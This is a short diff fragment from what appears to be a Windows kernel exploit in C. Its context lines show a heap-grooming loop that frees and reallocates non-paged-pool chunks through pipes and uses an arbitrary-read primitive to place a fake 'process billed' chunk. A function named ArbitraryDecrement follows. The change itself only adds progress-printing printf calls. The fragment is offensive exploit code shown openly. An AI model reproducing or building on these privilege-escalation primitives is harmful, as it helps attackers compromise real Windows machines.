@@ -120,10 +120,12 @@ void setFakeProcessBilled(exploit_pipes_t* pipes, exploit_addresses_t* addrs, ui
     uintptr_t pipe_queue_entry_addr = NULL;
     do
     {
+        printf(".");
         FreeNPPNxChunk(pipes->previous_chunk_pipe, VULN_BLOCK_SIZE);
         pipes->previous_chunk_pipe = AllocNPPNxChunk(&g_fake_process_billed_chunk, VULN_BLOCK_SIZE);
         ArbitraryRead(&pipes->ghost_chunk_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
     } while (pipe_queue_entry_addr != 0x4141414141414141);
+    printf("\n");
 }
 
 int ArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintptr_t addr_to_decrement)
